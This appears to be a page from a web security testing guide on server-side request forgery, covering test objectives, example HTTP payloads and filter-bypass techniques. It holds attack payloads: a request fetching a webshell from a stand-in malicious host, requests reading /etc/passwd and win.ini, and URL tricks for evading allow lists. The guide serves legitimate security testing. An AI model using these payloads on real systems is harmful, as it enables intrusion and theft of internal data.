# Testing for Server-Side Request Forgery

## Summary

Often web applications may have to interact with internal or external resources in order to provide a certain functionality, with the expectation tha only the service providing that functionality will be used, but often such functionality processes user data and if not handled properly it can open the door for certain injection attacks that we call SSRF. A successful SSRF attack can grant the attacker access to restricted actions, internal services, internal files within the application or the organization. In some cases it can even lead to RCE.

Some of the main mitigation techniques include IP whitelisting and URL filtering. You can find out more on the
[OWASP Server Side Request Forgery Prevention Cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)

## Test Objectives

- Identify injection points (External resource calls, API calls)
- Test if the SSRF is exploitable
- Asses the severity of the vulnerability

## How to Test

When testing for SSRF we are trying to trick the server into loading/writing unintended content. The most common test is for local and remote file inclusion, but there is another facet to SSRF, a trust relationship that often arises with server-side request forgery where the application server is able to interact with other back-end systems that are not directly reachable by users. These systems often have non-routable private IP addresses or are restricted to certain hosts. Since they are protected by the network topology, they often lack more sophisticated controls.

Such internal systems often contain sensitive data or functionality.

If we have the following request:

```bash
GET /page HTTP/1.0
Content-Type: application/x-www-form-urlencoded

page=about.php
```

We can try the following payloads:

Return the content of an external resource like a webshell.

```bash
GET /page HTTP/1.0
Content-Type: application/x-www-form-urlencoded

page=https://malicioussite.com/shell.php
```

Use the localhost/loopback interface to access content restricted to the host only. This mechanism implies that if you have access to the host than you have enough privileges to directly access the `admin` page.

These kind of trust relationships, where requests originating from the local machine are handled differently than ordinary requests, is often what makes SSRF into a critical vulnerability.

```bash
GET /page HTTP/1.0
Content-Type: application/x-www-form-urlencoded

page=http://localhost/admin  #Alternative http://127.0.0.1/admin
```

Fetch a local file

```bash
GET /page HTTP/1.0
Content-Type: application/x-www-form-urlencoded

page=file:///etc/passwd
```

All of the examples above apply to POST requests, they can also be injected into headers if the header data is used in such a way.
One important note on SSRF with post requests is that the SSRF might turn into a Blind SSRF, because the application might not return anything, but anyway that data might be used in another functionality like PDF reports for example.

You can find more on Blind SSRF [here](https://portswigger.net/web-security/ssrf/blind), or in the [References section](#references)

### PDF Generators

There are some cases where server converts uploaded file to a pdf.Try injecting `<iframe>`, `<img>`, `<base>` or `<script>` elements or CSS url() functions pointing to internal services.

```html
<iframe src="file:///etc/passwd" width="400" height="400">
<iframe src="file:///c:/windows/win.ini" width="400" height=”400">
```

### Common filter bypass

Some applications block references to `localhost` and `127.0.0.1`, this can be circumvented by:

- Using alternative IP representation such as such as 2130706433, 017700000001, or 127.1 which evaluated to 127.0.0.1
- String obfuscation
- Registering your own domain that resolves to 127.0.0.1

Sometimes the application allows input that matches a certain expression, like a domain. That can be circumvented if the URL schema parser is not properly implemented.

- Using the `@` character: `https://expected-domain@attacker-domain`
- URL fragmentation with the `#` character: `https://attacker-domain#expected-domain`
- URL encoding
- Fuzzing
- Combinations of all of the above

You can find more payloads [here](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)

## Tools

- Burpsuite
- ZAP

## References

- [SSRF Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
- [Reading Internal Files Using SSRF Vulnerability](https://medium.com/@neerajedwards/reading-internal-files-using-ssrf-vulnerability-703c5706eefb)
- [Abusing the AWS Metadata Service Using SSRF Vulnerabilities](https://blog.christophetd.fr/abusing-aws-metadata-service-using-ssrf-vulnerabilities/)
- [OWASP Server Side Request Forgery Prevention Cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [SSRF](https://portswigger.net/web-security/ssrf)
- [Blind SSRF](https://portswigger.net/web-security/ssrf/blind)
